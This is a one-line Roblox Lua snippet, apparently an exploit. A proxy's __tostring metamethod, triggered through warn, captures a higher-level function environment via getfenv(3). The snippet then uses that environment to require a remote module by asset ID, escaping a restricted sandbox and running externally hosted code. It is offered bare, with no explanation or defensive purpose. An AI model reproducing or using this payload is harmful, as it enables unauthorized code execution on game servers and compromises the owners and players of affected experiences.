a=newproxy(true) getmetatable(a)['__tostring']=function() a=getfenv(3) end pcall(warn,a) a.require(421551930)
